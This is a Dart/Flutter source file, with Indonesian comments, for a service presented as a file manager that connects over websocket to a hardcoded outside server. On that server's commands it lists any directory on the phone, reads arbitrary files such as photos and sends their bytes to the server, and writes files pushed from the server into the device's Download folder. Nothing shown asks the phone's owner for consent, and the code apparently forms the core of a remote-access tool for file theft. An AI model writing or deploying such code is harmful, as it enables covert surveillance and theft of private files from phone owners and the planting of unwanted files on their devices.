import 'dart:io';
import 'package:socket_io_client/socket_io_client.dart' as IO;

class FileManagerService {
  late IO.Socket socket;

  void connectToDashboard() {
    // Hubungkan ke server dashboard lo
    socket = IO.io('http://node-nyk-dilzz.hostkita.help:2439', <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
    });

    socket.onConnect((_) {
      print('Terhubung ke Dashboard, siap mengelola file');
    });

    // 🔍 FITUR 1: Melihat daftar file dan folder di dalam suatu direktori
    socket.on('perintah_lihat_folder', (data) async {
      String pathDirektori = data['path']; // Misal: /storage/emulated/0/
      Directory dir = Directory(pathDirektori);

      try {
        if (await dir.exists()) {
          List<Map<String, dynamic>> daftarItem = [];

          // Ambil semua isi file dan folder di dalamnya secara asinkron
          await for (FileSystemEntity entity in dir.list(recursive: false, followLinks: false)) {
            daftarItem.add({
              'nama': entity.path.split('/').last,
              'path': entity.path,
              'is_folder': entity is Directory, // True jika folder, False jika file
              'ukuran': entity is File ? await (entity as File).length() : 0, // Ukuran bytes jika file
            });
          }

          // Kirim daftarnya kembali ke dashboard admin
          socket.emit('respon_daftar_folder', {
            'current_path': pathDirektori,
            'items': daftarItem,
          });
        } else {
          socket.emit('error_file', {'pesan': 'Folder tidak ditemukan'});
        }
      } catch (e) {
        socket.emit('error_file', {'pesan': 'Gagal mengakses folder: $e'});
      }
    });

    // 📥 FITUR 2: Menerima perintah dari Dashboard untuk NGAMBIL file dari HP
    socket.on('perintah_ambil_file', (data) async {
      String pathFileTarget = data['path']; // Misal: /storage/emulated/0/Download/foto.jpg
      File file = File(pathFileTarget);

      try {
        if (await file.exists()) {
          List<int> fileBytes = await file.readAsBytes();
          // Kirim balik file dalam bentuk biner/bytes ke dashboard
          socket.emit('kirim_file_ke_dashboard', {
            'nama_file': file.path.split('/').last,
            'bytes': fileBytes,
          });
        } else {
          socket.emit('error_file', {'pesan': 'File tidak ditemukan'});
        }
      } catch (e) {
        socket.emit('error_file', {'pesan': 'Gagal membaca file: $e'});
      }
    });

    // 📤 FITUR 3: Menerima file kiriman dari Dashboard untuk DIMASUKKIN ke HP
    socket.on('perintah_masukin_file', (data) async {
      String namaFile = data['nama_file'];
      List<int> fileBytes = List<int>.from(data['bytes']);
      
      // Secara default disimpan ke folder Download utama perangkat
      String pathSimpan = '/storage/emulated/0/Download/$namaFile';
      File fileBaru = File(pathSimpan);

      try {
        await fileBaru.writeAsBytes(fileBytes);
        socket.emit('respon_sukses', {'pesan': 'File berhasil dimasukkan ke $pathSimpan'});
      } catch (e) {
        socket.emit('error_file', {'pesan': 'Gagal menyimpan file ke HP: $e'});
      }
    });
  }
}
